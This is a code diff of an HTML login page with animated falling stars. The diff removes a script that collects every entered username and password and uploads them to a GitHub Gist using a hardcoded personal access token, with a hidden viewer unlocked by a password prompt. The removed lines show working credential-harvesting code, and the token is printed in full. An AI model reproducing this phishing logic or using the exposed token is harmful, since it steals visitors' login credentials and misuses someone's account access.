@@ -24,13 +24,23 @@
             z-index: 1;
         }
 
-        .star {
+        .star, .gif {
             position: absolute;
             animation: moveDown 5s linear infinite;
             opacity: 0.8;
+        }
+
+        .star {
             width: 2px;
             height: 2px;
             background: white;
+        }
+
+        .gif {
+            width: 30px;
+            height: 30px;
+            background-image: url('giphy.gif');
+            background-size: cover;
         }
 
         @keyframes moveDown {
@@ -127,6 +137,7 @@
             color: #45a049;
         }
 
+        /* Positioning the hr.jfif image */
         .logo {
             position: absolute;
             top: 10px;
@@ -135,9 +146,9 @@
             height: auto;
             opacity: 0.7;
             z-index: 3;
-            cursor: pointer;
         }
 
+        /* Image overlay for pack.png */
         .image-overlay {
             display: none;
             position: fixed;
@@ -162,31 +173,11 @@
             display: flex;
             opacity: 1;
         }
-
-        .text-area-container {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-        }
-
-        .text-area-container textarea {
-            width: 100%;
-            height: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
     </style>
 </head>
 <body>
     <div class="falling-elements">
+        <!-- Create multiple star and GIF elements -->
         <div class="star" style="top: 10%; left: 20%; animation-duration: 2s;"></div>
         <div class="star" style="top: 30%; left: 50%; animation-duration: 4s;"></div>
         <div class="star" style="top: 60%; left: 80%; animation-duration: 3s;"></div>
@@ -197,8 +188,10 @@
         <div class="star" style="top: 5%; left: 30%; animation-duration: 4.5s;"></div>
         <div class="star" style="top: 85%; left: 25%; animation-duration: 3.2s;"></div>
         <div class="star" style="top: 45%; left: 85%; animation-duration: 4.7s;"></div>
+
     </div>
 
+    <!-- Logo in the top right corner -->
     <img src="hr.jfif" alt="Logo" class="logo">
 
     <div class="login-container">
@@ -217,88 +210,31 @@
         <a href="#" class="signup-link">Don't have an account? Sign up</a>
     </div>
 
+    <!-- Image overlay for pack.png -->
     <div class="image-overlay" id="imageOverlay">
         <img src="pack.png" alt="Pack Image">
     </div>
 
-    <div class="text-area-container" id="textAreaContainer">
-        <textarea id="textArea" rows="10" cols="30" placeholder="Type your text here..."></textarea>
-    </div>
-
     <script>
-        const GITHUB_TOKEN = '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'; // Replace with your GitHub token
-        const GIST_ID = 'a2a704439b6e63da0a509c1125f5a936'; // Your Gist ID
-
-        function saveToGist(content) {
-    fetch(`https://api.github.com/gists/${GIST_ID}`, {
-        method: 'PATCH',
-        headers: {
-            'Authorization': `token ${GITHUB_TOKEN}`,
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            files: {
-                'loginData.txt': {
-                    content: content
-                }
-            }
-        })
-    })
-    .then(response => {
-        if (!response.ok) {
-            console.error('HTTP error:', response.status, response.statusText);
-            return response.text(); // Get the response body text to understand the error
-        }
-        return response.json();
-    })
-    .then(data => console.log('Gist updated:', data))
-    .catch(error => console.error('Error:', error));
-}
-
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent the form from submitting
 
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
 
             if (username !== '' && password !== '') {
+                // Show the pack.png image with a smooth transition
                 var overlay = document.getElementById('imageOverlay');
                 overlay.classList.add('show');
-
-                setTimeout(function() {
-                    overlay.classList.remove('show');
-                }, 2000);
-
-                var textArea = document.getElementById('textArea');
-                textArea.value += `Username: ${username}\nPassword: ${password}\n\n`;
-
-                saveToGist(textArea.value);
             }
         });
 
-        function loadSavedData() {
-            var savedData = localStorage.getItem('loginData');
-            if (savedData) {
-                var textArea = document.getElementById('textArea');
-                textArea.value = savedData;
-            }
-        }
-        window.onload = loadSavedData;
-
-        let canShowTextArea = false;
-        document.querySelector('.logo').addEventListener('click', function() {
-            if (canShowTextArea) {
-                var textAreaContainer = document.getElementById('textAreaContainer');
-                textAreaContainer.style.display = textAreaContainer.style.display === 'none' || textAreaContainer.style.display === '' ? 'block' : 'none';
-            } else {
-                var password = prompt("Please enter the password to access the text area:");
-                if (password === '1306') {
-                    canShowTextArea = true;
-                    var textAreaContainer = document.getElementById('textAreaContainer');
-                    textAreaContainer.style.display = 'block';
-                } else {
-                    alert('Incorrect password');
-                }
+        // Add click event listener to the document
+        document.addEventListener('click', function(event) {
+            var overlay = document.getElementById('imageOverlay');
+            // Check if the click was outside the overlay content
+            if (!overlay.contains(event.target)) {
+                overlay.classList.remove('show');
             }
         });
     </script>
